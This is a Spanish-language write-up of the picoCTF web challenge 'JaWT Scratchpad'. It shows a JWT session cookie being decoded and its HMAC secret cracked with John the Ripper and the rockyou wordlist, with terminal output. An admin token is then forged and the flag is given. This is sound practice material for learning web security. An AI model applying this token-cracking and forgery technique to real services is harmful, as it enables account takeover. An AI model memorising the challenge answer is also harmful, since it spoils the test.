#Software #Hacking #WebExplotation #Web #Internet 
# Definición
Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/63090/` or http://jupiter.challenges.picoctf.org:63090
# Hints
- What is that cookie?
- Have you heard of JWT?
# Solución
Utilizamos [[JWT]] para conseguir la contraseña -pues es la forma en la que esta codificada la contraseña-, utilizando la cookie.

Y utilizamos el cookie editor para conseguir la cookie:
>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRyaWFuIn0.ofYE3VCrgHYjfDd0jqeprRJuFZh3tMqB4IWBKxLdayE

El token que esta en [[Codificación Base 64]]  lo transformamos para ver su contenido-apoyándonos de [cyberchef](https://cyberchef.org/) o podemos simplemente usar [jwt Debugger](https://jwt.io/)-.

Una vez que lo vemos cambiamos el usuario por admin, y tratamos de mandar la cookie modificada, pero esto marca un error por como funciona JWT -viene acompañada de una firma-.

Por lo que ocupamos crackear la cookie usando la terminal, apoyándonos con [John](https://github.com/magnumripper/JohnTheRipper). Y descubrimos que la contraseña es 'ilovepico'. 

```bash
┌──(kali㉿kali)-[~]  
└─$ nano hash  
                                                                               
┌──(kali㉿kali)-[~]  
└─$ cat hash  
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRyaWFuIn0.ofYE3VCrgHYjfDd0jqeprRJuFZh3tMqB4IWBKxLdayE

  

desencriptar:

┌──(kali㉿kali)-[~]  
└─$ ls /usr/share/wordlists  
amass      dnsmap.txt     john.lst    nmap.lst        wfuzz  
dirb       fasttrack.txt  legion      rockyou.txt.gz  wifite.txt  
dirbuster  fern-wifi      metasploit  sqlmap.txt

  

──(kali㉿kali)-[~]  
└─$ sudo gzip -d /usr/share/wordlists/rockyou.txt.gz  
                                                                               
┌──(kali㉿kali)-[~]  
└─$ ls /usr/share/wordlists                          
amass      dnsmap.txt     john.lst    nmap.lst     wfuzz  
dirb       fasttrack.txt  legion      rockyou.txt  wifite.txt  
dirbuster  fern-wifi      metasploit  sqlmap.txt

  

┌──(kali㉿kali)-[~]  
└─$ head /usr/share/wordlists/rockyou.txt    
123456  
12345  
123456789  
password  
iloveyou  
princess  
1234567  
rockyou  
12345678  
abc123

  

┌──(kali㉿kali)-[~]  
└─$ john hash -w=/usr/share/wordlists/rockyou.txt  
Using default input encoding: UTF-8  
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])  
Will run 4 OpenMP threads  
Press 'q' or Ctrl-C to abort, almost any other key for status  
ilovepico        (?)      
1g 0:00:00:01 DONE (2025-04-05 20:58) 0.6896g/s 5101Kp/s 5101Kc/s 5101KC/s ilovetitor..ilovemymother@  
Use the "--show" option to display all of the cracked passwords reliably  
Session completed.
```

Modificando la cookie obtenemos la bandera:
picoCTF{jawt_was_just_what_you_thought_f859ab2f}
## Respuesta
picoCTF{jawt_was_just_what_you_thought_f859ab2f}